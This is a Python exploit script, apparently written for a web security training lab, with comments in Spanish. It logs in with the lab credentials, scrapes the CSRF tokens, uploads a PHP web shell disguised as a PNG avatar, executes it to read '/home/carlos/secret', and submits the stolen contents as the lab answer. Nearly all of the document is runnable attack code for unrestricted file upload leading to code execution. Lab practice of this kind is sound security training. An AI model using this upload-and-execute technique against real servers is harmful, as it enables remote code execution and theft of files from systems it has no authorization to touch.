#!/usr/bin/env python3
import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings()

proxies={ "http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"  }
gyC="\033[0;37m\033[1m"
yC="\033[0;33m\033[1m"
bC="\033[0;34m\033[1m"
gC="\033[0;32m\033[1m"
rC="\033[0;31m\033[1m"
eC="\033[0m"
def uploadFile(url):
    data={"csrf":"","username":"wiener","password":"peter"}
    data2={"csrf":"","user":"wiener"}
    cookies = {"session":""}

    response = requests.get(url+"/login",verify=False,proxies=proxies)
    if response.status_code !=200:
        print("Error al realizar la request")
        sys.exit(1)
    #Obtencion cookie de pagina login
    cookies["session"]=response.cookies.get("session")
    #Obtencion csrf de pagina login
    arbol = BeautifulSoup(response.text,"lxml")
    nodo = str(arbol.find("input", attrs={"name":"csrf"}))
    data["csrf"] = re.search("value=\"([^\"]*)",nodo).group(1)
    #Inicio de sesion
    print(f"""\n{yC}[+] {gyC}Datos usados para inicio de sesion: {eC}\n
    {gyC}Cookie "session":{gC} {cookies['session']}
    {gyC}csrf: {gC}{data['csrf']}
    {gyC}username: {gC}wiener
    {gyC}password: {gC}peter
    """)
    #Obtencion nueva cookie de 
    response = requests.post(url+"/login", data=data, proxies=proxies,verify=False,cookies=cookies,allow_redirects=False)   
    cookies["session"]=response.cookies.get("session")
    response = requests.get(url+"/my-account?id=wiener", proxies=proxies,verify=False,cookies=cookies)
    arbol= BeautifulSoup(response.text,"lxml")
    nodo = arbol.find("input",attrs={"name":"csrf"})
    data2["csrf"]=re.search("value=\"([^\"]*)",str(nodo)).group(1)
    #Datos usados para subidad de archivo
    print(f"""\n{yC}[+] {gyC}Datos usados para subida de archivo:\n
    {gyC}Cookie "session": {gC}{cookies['session']}
    {gyC}csrf: {gC}{data2['csrf']}
    {gyC}name: {gC}wiener
    """)
    #Subida de archivo
    response = requests.post(
        url+"/my-account/avatar",
        verify=False,
        proxies=proxies,
        cookies=cookies,
        data=data2,
        files={"avatar":("webshell.php","<?php echo file_get_contents('/home/carlos/secret'); ?>","image/png")}
    )

    print(f"\n{yC}[+] {gyC}Provocando ejecucion de webshell.php realizando peticion a /files/avatars/webshell.php...{eC}\n")
    response = requests.get(
        url+"/files/avatars/webshell.php",
        verify=False,
        cookies=cookies,
        proxies=proxies
    )    
    print(f"   {gyC} Contenido de archivo objetivo:{bC} {response.text}{eC} ")
    requests.post(url+"/submitSolution",verify=False,cookies=cookies,proxies=proxies,data={"answer":f"{response.text}"})
        
if __name__ == "__main__":
    if len(sys.argv)!=2:
        print(f"\n{yC}[+] {gyC}Uso: {gC}{sys.argv[0]} {bC}http://ejemplo.com{eC}")
        sys.exit(1)
    uploadFile(sys.argv[1].strip("/"))
